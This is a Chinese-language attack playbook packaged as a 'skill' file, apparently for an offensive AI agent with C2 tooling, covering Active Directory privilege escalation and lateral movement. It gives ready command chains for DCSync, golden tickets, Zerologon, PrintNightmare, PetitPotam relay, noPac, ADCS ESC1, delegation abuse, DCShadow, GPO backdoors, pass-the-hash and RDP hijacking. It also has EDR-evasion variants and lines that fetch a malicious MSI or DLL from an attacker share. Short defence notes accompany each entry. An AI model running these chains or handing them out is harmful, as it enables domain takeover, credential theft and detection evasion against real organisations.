# skill: intranet_lateral
title: Domain Penetration & Lateral Movement
when: lateral movement,domain penetration,kerberos,ntlm relay,domain controller
tier: domain

## VOIDFORGE TOOL MAP
skills: kerberos_delegation, adcs_abuse, identity_windows (domain); tools: shell_session, c2_pulse

## OPERATING CONTEXT
Grafted from the reverse-skill src-hunter corpus (WooYun-derived, MIT) — original zh preserved; FR/EN agent reads it fluently.

## SOURCE: 域渗透攻击.md

# 域渗透攻击

_14 条 intranet payload_

### 域内权限提升路径  `domain-privilege-escalation`
_利用ACL错误配置进行域权限提升_
子类：**权限提升** · tags: `acl` `privilege` `active-directory` `escalation`

**前置条件：**
- 域环境
- 普通域用户凭证
- BloodHound分析结果

**攻击链：**

**BloodHound分析**
> 查询到域管理员的最短路径
```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

**查找WriteDACL**
> 查找WriteDACL权限
_platform: windows_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

**利用WriteDACL**
> 添加DCSync权限
_platform: windows_
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
```

**执行DCSync**
> 执行DCSync获取域管哈希
_platform: windows_
```
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
```

**查找GenericAll**
> 查找GenericAll权限
_platform: windows_
```
Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

**重置密码**
> 重置目标用户密码
_platform: windows_
```
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

**EDR 绕过变体：**

**隐蔽操作**
> 指定域控制器操作
```
Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
```


**分析：** 域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。

**OPSEC 提示：**
- ACL修改会产生日志
- 优先使用隐蔽的权限
- BloodHound可以发现攻击路径

**概述：** Active Directory中的ACL错误配置允许低权限用户获取高权限。

**漏洞原理：** AD中的ACL配置错误可能允许低权限用户修改高权限对象的属性或权限。

**利用方法：** 利用流程：1) 使用BloodHound分析；2) 发现ACL攻击路径；3) 利用权限提升；4) 获取高权限。

**防御措施：** 防御措施：1) 定期审计ACL配置；2) 最小权限原则；3) 监控ACL修改；4) 部署异常检测。

---

### 跨域信任攻击  `domain-cross-trust`
_利用域信任关系进行跨域攻击_
子类：**跨域攻击** · tags: `trust` `cross-domain` `active-directory` `forest`

**前置条件：**
- 已获取源域权限
- 存在域信任关系
- 目标域信息

**攻击链：**

**枚举信任关系**
> 枚举域信任关系
_platform: windows_
```
Get-NetDomainTrust
```

**枚举森林信任**
> 枚举森林信任关系
_platform: windows_
```
Get-NetForestTrust
```

**跨域用户枚举**
> 枚举目标域用户
_platform: windows_
```
Get-NetUser -Domain target.domain.com
```

**跨域组枚举**
> 枚举目标域组
_platform: windows_
```
Get-NetGroup -Domain target.domain.com
```

**SID History攻击**
> 利用SID History跨域提权
_platform: windows_
```
mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
```
**语法解析：**
- `/sids` — 添加目标域的SID _parameter_
- `519` — Enterprise Admins组的RID _value_

**跨域票据**
> 请求目标域票据
_platform: windows_
```
asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
```

**EDR 绕过变体：**

**隐蔽跨域**
> 指定目标域控制器枚举
```
Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
```


**分析：** 跨域信任攻击可以利用信任关系从低安全域向高安全域移动。

**OPSEC 提示：**
- 跨域攻击会产生日志
- SID History需要特殊权限
- 森林信任更安全

**概述：** 域信任关系允许跨域访问，攻击者可以利用信任关系进行横向移动。

**漏洞原理：** 域信任关系可能允许攻击者从一个域访问另一个域的资源，SID History可以用于跨域提权。

**利用方法：** 利用流程：1) 枚举信任关系；2) 分析信任类型；3) 利用信任关系；4) 跨域横向移动。

**防御措施：** 防御措施：1) 审计信任关系；2) 使用选择性认证；3) 监控跨域活动；4) 定期审查SID History。

---

### Zerologon攻击  `zerologon`
_CVE-2020-1472 Netlogon提权_
子类：**Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`

**前置条件：**
- 可访问域控制器RPC

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python zerologon_tester.py DC_NAME DC_IP
检测是否存在漏洞
```

**利用漏洞**
> 利用漏洞
_platform: linux_
```
python zerologon_exploit.py DC_NAME DC_IP
将DC密码置空
```
**语法解析：**
- `zerologon_exploit.py` — 利用脚本 _keyword_
- `DC_NAME` — 域控制器名称 _keyword_

**导出哈希**
> 导出哈希
_platform: linux_
```
secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
导出域内所有哈希
```

**恢复密码**
> 恢复密码
_platform: linux_
```
python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
恢复域控密码避免破坏
```


**概述：** Zerologon可重置域控制器密码为空。

**漏洞原理：** Netlogon协议加密缺陷。

**利用方法：** 利用流程：1) 检测漏洞 2) 重置密码 3) 导出哈希 4) 恢复密码

**防御措施：** 防御措施：1) 安装补丁 2) 强制安全RPC 3) 监控异常登录

---

### PrintNightmare攻击  `printnightmare`
_CVE-2021-34527 打印服务漏洞_
子类：**PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`

**前置条件：**
- 可访问打印服务RPC

**攻击链：**

**检测漏洞**
> 检测打印服务
_platform: linux_
```
rpcdump.py @DC_IP | grep MS-RPRN
检查打印服务是否可用
```

**利用漏洞**
> 利用漏洞
_platform: linux_
```
python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
加载恶意DLL获取SYSTEM权限
```
**语法解析：**
- `-target` — 目标IP _parameter_
- `-payload` — 恶意DLL路径 _parameter_

**Impacket利用**
> 使用Impacket
_platform: linux_
```
python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
触发加载远程DLL
```


**概述：** PrintNightmare可远程执行代码。

**漏洞原理：** 打印服务存在远程代码执行漏洞。

**利用方法：** 利用流程：1) 检测打印服务 2) 构造恶意DLL 3) 触发加载

**防御措施：** 防御措施：1) 安装补丁 2) 禁用打印服务 3) 网络隔离

---

### PetitPotam攻击  `petitpotam`
_CVE-2021-36942 强制认证攻击_
子类：**PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`

**前置条件：**
- 可访问EFSRPC接口

**攻击链：**

**启动中继**
> 启动NTLM中继
_platform: linux_
```
python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
设置NTLM中继到ADCS
```

**触发认证**
> 触发认证
_platform: linux_
```
python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
强制DC向攻击者认证
```
**语法解析：**
- `petitpotam.py` — PetitPotam利用脚本 _keyword_
- `attacker_ip` — 中继服务器IP _keyword_

**获取证书**
> 获取证书
_platform: linux_
```
中继成功后获取用户证书
使用证书进行Pass-the-Cert
```


**概述：** PetitPotam可强制机器账户认证。

**漏洞原理：** EFSRPC接口可被滥用。

**利用方法：** 利用流程：1) 启动中继 2) 触发认证 3) 中继到ADCS

**防御措施：** 防御措施：1) 安装补丁 2) 禁用EFSRPC 3) 保护ADCS

---

### noPac/SAMAccountName攻击  `samaccountname`
_CVE-2021-42278/CVE-2021-42287 域提权_
子类：**noPac** · tags: `nopac` `cve-2021-42278` `privesc`

**前置条件：**
- 普通域用户权限

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python noPac.py domain/user:password -dc-ip DC_IP -debug
检测是否存在漏洞
```

**利用漏洞**
> 利用漏洞
_platform: linux_
```
python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取域管权限
```
**语法解析：**
- `-dc-ip` — 域控制器IP _parameter_
- `-shell` — 获取Shell _parameter_

**攻击原理**
> 攻击原理
```
1. 创建机器账户(名称类似DC)
2. 清除SPN
3. 请求TGT
4. 删除机器账户
5. 获取域管TGT
```


**概述：** noPac可从普通用户提权到域管理员。

**漏洞原理：** SAM-Account-Name欺骗和PAC验证缺陷。

**利用方法：** 利用流程：1) 创建机器账户 2) 清除SPN 3) 获取域管TGT

**防御措施：** 防御措施：1) 安装补丁 2) 限制机器账户创建 3) 监控异常账户

---

### ADCS滥用攻击  `adcs-abuse`
_Active Directory证书服务滥用_
子类：**ADCS** · tags: `adcs` `certificate` `domain`

**前置条件：**
- ADCS服务可访问

**攻击链：**

**枚举ADCS**
> 枚举ADCS配置
_platform: linux_
```
certipy find -u user@domain -p password -dc-ip DC_IP
枚举证书模板
```

**请求用户证书**
> 请求证书
_platform: linux_
```
certipy req -u user@domain -p password -ca CA_NAME -template User
请求用户证书
```
**语法解析：**
- `certipy req` — 请求证书命令 _keyword_
- `-ca` — 证书颁发机构 _parameter_
- `-template` — 证书模板 _parameter_

**Pass-the-Cert**
> 使用证书认证
_platform: linux_
```
certipy auth -pfx user.pfx -dc-ip DC_IP
使用证书获取TGT
```

**Rubeus请求**
> Rubeus利用
_platform: windows_
```
Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
使用Rubeus请求TGT
```


**概述：** ADCS可被滥用获取用户证书进行认证。

**漏洞原理：** 证书模板配置不当。

**利用方法：** 利用流程：1) 枚举ADCS 2) 请求证书 3) Pass-the-Cert

**防御措施：** 防御措施：1) 审计证书模板 2) 限制模板权限 3) 监控证书请求

---

### ADCS ESC1漏洞  `adcs-esc1`
_证书模板ESC1滥用_
子类：**ADCS** · tags: `adcs` `esc1` `certificate`

**前置条件：**
- 存在ESC1配置的模板

**攻击链：**

**识别ESC1**
> 识别漏洞模板
_platform: linux_
```
certipy find -u user@domain -p password -vulnerable
查找ESC1漏洞模板
```

**利用ESC1**
> 请求域管证书
_platform: linux_
```
certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
指定SAN为域管
```
**语法解析：**
- `-alt` — 指定Subject Alternative Name _parameter_
- `admin@domain` — 目标用户UPN _value_

**认证为域管**
> 认证为域管
_platform: linux_
```
certipy auth -pfx admin.pfx -dc-ip DC_IP
使用证书认证为域管
```


**概述：** ESC1允许在证书请求中指定任意SAN。

**漏洞原理：** 模板允许用户指定SAN且可用于客户端认证。

**利用方法：** 利用流程：1) 找到ESC1模板 2) 指定域管SAN 3) 获取域管证书

**防御措施：** 防御措施：1) 禁用SAN指定 2) 限制模板权限 3) 监控证书请求

---

### 约束委派攻击  `constrained-delegation`
_利用约束委派进行横向移动_
子类：**委派攻击** · tags: `delegation` `constrained` `kerberos`

**前置条件：**
- 存在约束委派配置的账户

**攻击链：**

**查找约束委派**
> 查找约束委派账户
_platform: windows_
```
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
或
bloodhound查询
```

**获取服务票据**
> S4U2Self + S4U2Proxy
_platform: windows_
```
Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
获取域管的服务票据
```
**语法解析：**
- `s4u` — S4U扩展 _keyword_
- `/impersonateuser` — 模拟的用户 _parameter_
- `/msdsspn` — 目标服务SPN _parameter_

**使用票据**
> 注入票据
_platform: windows_
```
Rubeus.exe ptt /ticket:BASE64_TICKET
注入票据并访问服务
```


**概述：** 约束委派允许账户模拟用户访问特定服务。

**漏洞原理：** 约束委派配置可被滥用。

**利用方法：** 利用流程：1) 找到委派账户 2) S4U获取票据 3) 访问目标服务

**防御措施：** 防御措施：1) 审计委派配置 2) 使用受保护用户组 3) 监控S4U请求

---

### 基于资源的约束委派  `resource-delegation`
_利用RBCD进行权限提升_
子类：**委派攻击** · tags: `rbcd` `delegation` `kerberos`

**前置条件：**
- 对目标对象有WriteDACL权限

**攻击链：**

**创建机器账户**
> 创建机器账户
_platform: windows_
```
New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
创建新的机器账户
```

**配置RBCD**
> 配置RBCD
_platform: windows_
```
Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
设置委派关系
```
**语法解析：**
- `PrincipalsAllowedToDelegateToAccount` — 允许委派的账户 _keyword_

**利用RBCD**
> 利用RBCD
_platform: windows_
```
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
获取域管票据
```


**概述：** RBCD允许从目标对象配置委派关系。

**漏洞原理：** 对对象有WriteDACL权限可配置RBCD。

**利用方法：** 利用流程：1) 创建机器账户 2) 配置RBCD 3) 获取高权限票据

**防御措施：** 防御措施：1) 审计ACL权限 2) 保护关键对象 3) 监控RBCD配置

---

### DCShadow攻击  `dcshadow-attack`
_伪造域控制器注入数据_
子类：**DCShadow** · tags: `dcshadow` `domain` `injection`

**前置条件：**
- 域管理员权限
- 可注册新DC

**攻击链：**

**注册伪造DC**
> 注册伪造DC
_platform: windows_
```
mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
注册伪造DC并修改对象属性
```
**语法解析：**
- `lsadump::dcshadow` — DCShadow模块 _command_
- `/object` — 目标对象DN _parameter_
- `/attribute` — 要修改的属性 _parameter_

**推送更改**
> 推送更改
_platform: windows_
```
在另一个终端:
mimikatz # lsadump::dcshadow /push
推送更改到真实DC
```

**常见利用**
> 常见利用场景
_platform: windows_
```
修改用户组:
/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
添加SID History:
/attribute:sidHistory /value:S-1-5-21-xxx-500
```


**概述：** DCShadow可伪造DC向真实DC注入数据。

**漏洞原理：** AD复制机制可被滥用。

**利用方法：** 利用流程：1) 获取域管权限 2) 注册伪造DC 3) 推送恶意数据

**防御措施：** 防御措施：1) 监控DC注册 2) 审计复制事件 3) 保护域管账户

---

### 组策略滥用  `group-policy-abuse`
_滥用组策略进行横向移动_
子类：**组策略** · tags: `gpo` `group-policy` `domain`

**前置条件：**
- GPO编辑权限

**攻击链：**

**查找可编辑GPO**
> 查找可编辑GPO
_platform: windows_
```
Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
查找Domain Users可编辑的GPO
```

**添加计划任务**
> 添加计划任务
_platform: windows_
```
New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
添加立即执行的计划任务
```
**语法解析：**
- `New-GPOImmediateTask` — 创建立即任务 _keyword_
- `-GPODisplayName` — 目标GPO名称 _parameter_

**添加注册表项**
> 添加注册表启动项
_platform: windows_
```
Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
```


**概述：** 组策略可被滥用在目标机器执行代码。

**漏洞原理：** 用户对GPO有编辑权限。

**利用方法：** 利用流程：1) 找到可编辑GPO 2) 添加恶意配置 3) 等待应用

**防御措施：** 防御措施：1) 审计GPO权限 2) 监控GPO变更 3) 限制编辑权限

---

### SAM The Admin攻击  `sam-the-admin`
_CVE-2021-42278/CVE-2021-42287域提权_
子类：**SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`

**前置条件：**
- 域用户权限
- 域控制器存在漏洞

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP
检测是否存在漏洞
```

**利用漏洞**
> 获取域控权限
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
获取SYSTEM Shell
```
**语法解析：**
- `CVE-2021-42278` — sAMAccountName欺骗 _keyword_
- `CVE-2021-42287` — Kerberos PAC验证绕过 _keyword_

**执行命令**
> 执行命令
_platform: linux_
```
python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
```


**概述：** SAM The Admin利用sAMAccountName欺骗和PAC验证绕过提权。

**漏洞原理：** 域控制器未安装相关补丁。

**利用方法：** 利用流程：1) 创建机器账户 2) 修改sAMAccountName 3) 请求TGT 4) 删除账户 5) 请求S4U2Self

**防御措施：** 防御措施：1) 安装KB5008102补丁 2) 监控异常账户创建 3) 审计sAMAccountName修改

---

### NoAuth攻击  `noauth`
_CVE-2022-33679 Kerberos认证绕过_
子类：**NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`

**前置条件：**
- 域用户权限
- 目标账户有RC4密钥

**攻击链：**

**检测漏洞**
> 检测漏洞
_platform: linux_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
检测是否存在漏洞
```

**利用漏洞**
> 获取TGT
_platform: linux_
```
python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
获取目标用户TGT
```
**语法解析：**
- `CVE-2022-33679` — Kerberos RC4弱验证 _keyword_
- `RC4密钥` — 利用RC4加密类型绕过验证 _keyword_

**使用TGT**
> 使用获取的TGT
_platform: linux_
```
设置KRB5CCNAME环境变量
export KRB5CCNAME=administrator.ccache
使用psexec.py等工具
```


**概述：** NoAuth利用Kerberos RC4加密的验证缺陷。

**漏洞原理：** Kerberos RC4加密验证存在缺陷。

**利用方法：** 利用流程：1) 检测目标RC4密钥 2) 构造恶意请求 3) 获取TGT

**防御措施：** 防御措施：1) 安装补丁 2) 禁用RC4加密 3) 强制AES加密

---

---

## SOURCE: 横向移动.md

# 横向移动

_16 条 intranet payload_

### PsExec横向移动  `lateral-psexec`
_使用PsExec进行横向移动_
子类：**SMB** · tags: `psexec` `lateral` `smb` `windows`

**前置条件：**
- 目标机器开放445端口
- 拥有目标机器管理员凭证
- ADMIN$共享可访问

**攻击链：**

**基本使用**
> 使用Impacket的psexec.py连接目标
_platform: linux_
```
psexec.py domain/user:password@target_ip
```
**语法解析：**
- `psexec.py` — Impacket工具，实现PsExec功能 _command_
- `domain/user:password` — 认证信息格式 _value_
- `@target_ip` — 目标IP地址 _value_

**使用哈希连接**
> 使用NTLM哈希进行Pass-the-Hash
_platform: linux_
```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```
**语法解析：**
- `-hashes` — 指定哈希认证 _parameter_
- `:NTLM_HASH` — NTLM哈希值(LM:NTLM格式，LM留空) _value_

**执行命令**
> 在目标机器执行命令
_platform: linux_
```
psexec.py domain/user:password@target_ip "whoami"
```

**Windows PsExec**
> 使用Sysinternals PsExec
_platform: windows_
```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```
**语法解析：**
- `\\target_ip` — 目标机器IP _value_
- `-u` — 指定用户名 _parameter_
- `-p` — 指定密码 _parameter_

**EDR 绕过变体：**

**自定义服务名**
> 使用自定义服务名避免检测
```
psexec.py -service-name CustomService domain/user:password@target_ip
```

**SMBExec替代**
> 使用smbexec.py，不写入磁盘
```
smbexec.py domain/user:password@target_ip
```


**分析：** PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。

**OPSEC 提示：**
- PsExec会在目标机器创建服务，容易被检测
- 服务名称和二进制文件可能触发告警
- 考虑使用更隐蔽的横向移动方式

**概述：** PsExec是Sysinternals套件中的工具，允许在远程机器上执行进程。攻击者常用于横向移动。

**漏洞原理：** PsExec利用SMB协议和Windows服务机制，通过ADMIN$共享上传可执行文件并创建服务执行。

**利用方法：** 利用流程：1) 获取目标机器凭证；2) 通过SMB连接目标；3) 上传可执行文件到ADMIN$；4) 创建并启动服务；5) 获取远程Shell。

**防御措施：** 防御措施：1) 禁用ADMIN$共享；2) 限制SMB访问；3) 监控服务创建；4) 部署EDR检测异常行为。

---

### WMI横向移动  `lateral-wmi`
_使用WMI进行横向移动_
子类：**WMI** · tags: `wmi` `lateral` `windows` `remote`

**前置条件：**
- 目标机器开放135端口
- 拥有目标机器管理员凭证
- WMI服务可访问

**攻击链：**

**WMI执行命令**
> 使用WMIC远程执行命令
_platform: windows_
```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```
**语法解析：**
- `wmic` — Windows管理工具命令行 _command_
- `/node:` — 指定目标机器 _parameter_
- `/user:` — 指定用户名 _parameter_
- `process call create` — 调用创建进程方法 _command_

**Impacket wmiexec**
> 使用Impacket的wmiexec.py
_platform: linux_
```
wmiexec.py domain/user:password@target_ip
```
**语法解析：**
- `wmiexec.py` — Impacket WMI执行工具 _command_

**使用哈希**
> Pass-the-Hash通过WMI
_platform: linux_
```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**PowerShell WMI**
> 使用PowerShell WMI
_platform: windows_
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```
**语法解析：**
- `Invoke-WmiMethod` — PowerShell WMI方法调用 _command_
- `Win32_Process` — WMI进程类 _value_
- `-ComputerName` — 目标计算机名 _parameter_

**EDR 绕过变体：**

**WMI事件订阅**
> 通过WMI安装MSI包执行代码
```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```


**分析：** WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。

**OPSEC 提示：**
- WMI执行不会留下明显的文件痕迹
- 但WMI活动可能被监控
- 命令输出通过临时文件获取

**概述：** WMI(Windows Management Instrumentation)是Windows管理框架的核心组件，可用于远程管理和命令执行。

**漏洞原理：** WMI允许管理员远程管理Windows系统，攻击者可以利用此功能执行命令和横向移动。

**利用方法：** 利用流程：1) 获取目标凭证；2) 通过WMI连接目标；3) 调用Win32_Process创建进程；4) 执行命令获取结果。

**防御措施：** 防御措施：1) 限制WMI远程访问；2) 监控WMI活动；3) 部署EDR检测异常WMI调用；4) 使用防火墙限制135端口。

---

### Pass-the-Hash攻击  `pass-the-hash`
_使用NTLM哈希进行身份验证_
子类：**认证攻击** · tags: `pth` `ntlm` `hash` `authentication`

**前置条件：**
- 获取用户NTLM哈希
- 目标机器允许NTLM认证
- 目标机器开放SMB/WMI端口

**攻击链：**

**Impacket PtH**
> 使用Impacket进行PtH
_platform: linux_
```
psexec.py -hashes :NTHASH domain/user@target_ip
```
**语法解析：**
- `-hashes` — 指定哈希认证 _parameter_
- `:NTHASH` — NTLM哈希(LM:NTLM格式) _value_

**CrackMapExec PtH**
> 使用CrackMapExec进行PtH
_platform: linux_
```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```
**语法解析：**
- `crackmapexec smb` — CrackMapExec SMB模块 _command_
- `-H` — 指定NTLM哈希 _parameter_

**Windows PtH**
> 使用Mimikatz进行PtH
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

**PowerShell PtH**
> 使用PowerShell进行PtH
_platform: windows_
```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

**EDR 绕过变体：**

**Overpass-the-Hash**
> 将哈希转换为Kerberos票据
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```


**分析：** PtH成功后可以该用户身份访问目标机器，无需明文密码。

**OPSEC 提示：**
- PtH不会产生登录日志中的密码验证
- 但会留下网络登录日志
- 注意时间戳和来源IP

**概述：** Pass-the-Hash是一种利用NTLM哈希进行身份验证的攻击技术，攻击者无需知道明文密码即可通过认证。

**漏洞原理：** NTLM认证机制允许使用密码哈希进行认证，一旦哈希泄露，攻击者可以冒充用户身份。

**利用方法：** 利用流程：1) 获取用户NTLM哈希；2) 使用工具进行PtH；3) 获取目标机器访问权限；4) 执行后续攻击。

**防御措施：** 防御措施：1) 限制NTLM认证；2) 启用Kerberos；3) 监控异常登录；4) 使用受限管理模式。

---

### NTLM Relay攻击  `ntlm-relay`
_NTLM中继攻击技术_
子类：**认证攻击** · tags: `ntlm` `relay` `smb` `authentication`

**前置条件：**
- 目标机器开放SMB端口
- 目标机器未启用SMB签名
- 可诱导目标机器认证

**攻击链：**

**Responder监听**
> 启动Responder监听NTLM认证
_platform: linux_
```
responder -I eth0 -wrf
```
**语法解析：**
- `responder` — NTLM/LLMNR/NBT-NS欺骗工具 _command_
- `-I` — 指定网络接口 _parameter_
- `-wrf` — 启用WPAD、Finger、FTP服务 _parameter_

**ntlmrelayx攻击**
> 使用ntlmrelayx进行中继攻击
_platform: linux_
```
ntlmrelayx.py -tf targets.txt -smb2support
```
**语法解析：**
- `ntlmrelayx.py` — Impacket NTLM中继工具 _command_
- `-tf` — 目标文件 _parameter_
- `-smb2support` — 支持SMB2协议 _parameter_

**中继到LDAP**
> 中继到LDAP进行权限提升
_platform: linux_
```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

**IPv6中继**
> 使用IPv6进行NTLM中继
_platform: linux_
```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

**EDR 绕过变体：**

**Drop the MIC**
> 移除MIC标志绕过签名验证
```
ntlmrelayx.py -t smb://target --remove-mic
```


**分析：** NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。

**OPSEC 提示：**
- 需要目标机器未启用SMB签名
- 域控制器默认启用签名
- IPv6中继更隐蔽

**概述：** NTLM Relay是一种中间人攻击，攻击者将捕获的NTLM认证中继到其他服务，实现身份冒用。

**漏洞原理：** NTLM协议本身存在设计缺陷，允许中继攻击。如果目标服务器未启用签名验证，攻击者可以冒充受害者身份。

**利用方法：** 利用流程：1) 启动Responder或ntlmrelayx监听；2) 诱导目标机器发起认证；3) 中继认证到目标服务；4) 获取访问权限或执行操作。

**防御措施：** 防御措施：1) 启用SMB签名；2) 禁用NTLM认证；3) 启用Extended Protection for Authentication；4) 监控异常认证行为。

---

### WinRM横向移动  `lateral-winrm`
_通过WinRM进行横向移动_
子类：**WinRM** · tags: `winrm` `lateral` `powershell`

**前置条件：**
- WinRM启用
- 有效凭证

**攻击链：**

**PowerShell远程**
> PowerShell远程会话
_platform: windows_
```
Enter-PSSession -ComputerName target -Credential $cred
```
**语法解析：**
- `Enter-PSSession` — 进入远程PowerShell会话 _command_
- `-ComputerName target` — 目标计算机名 _parameter_
- `-Credential $cred` — 凭据对象 _parameter_

**执行命令**
> 远程执行命令
_platform: windows_
```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

**evil-winrm**
> 使用evil-winrm连接
_platform: linux_
```
evil-winrm -i target -u user -p password
```


**概述：** WinRM是Windows远程管理协议，可用于横向移动。

**漏洞原理：** WinRM默认启用，接受明文凭据。

**利用方法：** 利用流程：1) 确认WinRM启用 2) 使用有效凭证连接

**防御措施：** 防御措施：1) 限制WinRM访问 2) 使用证书认证 3) 监控日志

---

### DCOM横向移动  `lateral-dcom`
_通过DCOM进行横向移动_
子类：**DCOM** · tags: `dcom` `lateral` `com`

**前置条件：**
- DCOM启用
- 有效凭证

**攻击链：**

**MMC20.Application**
> 通过MMC DCOM执行命令
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```
**语法解析：**
- `MMC20.Application` — MMC COM对象 _value_
- `ExecuteShellCommand` — 执行Shell命令方法 _function_
- `"7"` — 窗口状态参数 _value_

**ShellBrowserWindow**
> 通过ShellBrowserWindow执行
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

**Excel DCOM**
> 通过Excel DCOM执行
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```


**概述：** DCOM允许远程创建COM对象并执行代码。

**漏洞原理：** 某些COM对象允许执行系统命令。

**利用方法：** 利用流程：1) 枚举可用COM对象 2) 远程创建实例 3) 执行命令

**防御措施：** 防御措施：1) 限制DCOM远程访问 2) 禁用危险COM对象

---

### SSH横向移动  `lateral-ssh`
_通过SSH进行横向移动_
子类：**SSH** · tags: `ssh` `lateral` `linux`

**前置条件：**
- SSH服务
- 有效凭证

**攻击链：**

**SSH连接**
> 基础SSH连接
_platform: linux_
```
ssh user@target
```

**SSH密钥认证**
> 使用私钥连接
_platform: linux_
```
ssh -i private_key user@target
```
**语法解析：**
- `-i private_key` — 指定私钥文件 _parameter_
- `user@target` — 用户名和目标地址 _value_

**SSH跳板**
> 通过跳板机连接
_platform: linux_
```
ssh -J jump_host user@target
```


**概述：** SSH是Linux环境常用的远程管理协议。

**漏洞原理：** 弱密码、密钥泄露、配置不当。

**利用方法：** 利用流程：1) 发现SSH服务 2) 尝试凭证 3) 连接执行

**防御措施：** 防御措施：1) 禁用密码认证 2) 使用密钥 3) 限制用户

---

### RDP会话劫持  `rdp-hijack`
_劫持已存在的RDP会话_
子类：**RDP** · tags: `rdp` `hijack` `session`

**前置条件：**
- SYSTEM权限
- 存在RDP会话

**攻击链：**

**列出会话**
> 列出所有用户会话
_platform: windows_
```
query user
```

**劫持会话**
> 劫持指定会话
_platform: windows_
```
tscon SESSION_ID /dest:console
```
**语法解析：**
- `tscon` — 终端服务连接命令 _command_
- `SESSION_ID` — 目标会话ID _variable_
- `/dest:console` — 连接到当前控制台 _parameter_

**使用Mimikatz**
> 使用Mimikatz劫持
_platform: windows_
```
ts::sessions
ts::remote /id:SESSION_ID
```


